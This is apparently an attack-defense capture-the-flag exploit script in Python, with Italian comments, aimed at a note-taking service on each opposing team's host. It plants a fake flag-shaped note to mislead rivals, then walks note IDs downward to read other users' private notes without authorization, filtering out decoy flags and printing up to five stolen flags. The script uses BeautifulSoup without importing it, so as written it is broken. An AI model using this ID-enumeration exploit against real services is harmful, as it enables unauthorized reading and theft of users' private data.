#!/usr/bin/env python3
import random
import string

from pwn import remote
import sys
import json
import requests


def generate_random_string(start=4, end=10):
    length = random.randint(start, end)
    letters = string.ascii_letters
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string.encode('utf-8')

count = 0
team = sys.argv[1]
headers = {'User-Agent': 'Mozilla/5.6 Gecko'}

note_data = {}
note_data['title'] = generate_random_string()
note_data['content'] = generate_random_string(32,32).upper() + b"=" # Per dare fastidio agli altri Team
note_data['private'] = ''

print(note_data)

id = requests.post(f'http://{team}:8080/new', headers=headers, data=note_data, timeout=20)
id.raise_for_status()
id = id.url.split("/view/")

for i in range(int(id[1]), -1, -1):
    r = requests.get(f'http://{team}:8080/view/{i}', headers=headers, timeout=10)

    if r.status_code != 200:    #Se non va a buon fine va al prossimo id
        continue
    beautifulsoup = BeautifulSoup(r.text, 'html.parser') #Vabbe si parsa tutto
    content = beautifulsoup.find('div', {'class': 'container'}).find('p').text
    title = beautifulsoup.find('div', {'class': 'container'}).find('h1').text
    if "Praise" in title or " " not in title:
        continue

    blacklisted = ["NONSOCHE", "BYSTECCA", "ABCD"] #Blacklist per evitare flag spam

    if len(content) == 32 and content[-1] == "=" and all(black not in content for black in blacklisted):
        print(content, flush=True)
        count += 1
        if count == 5:
            break
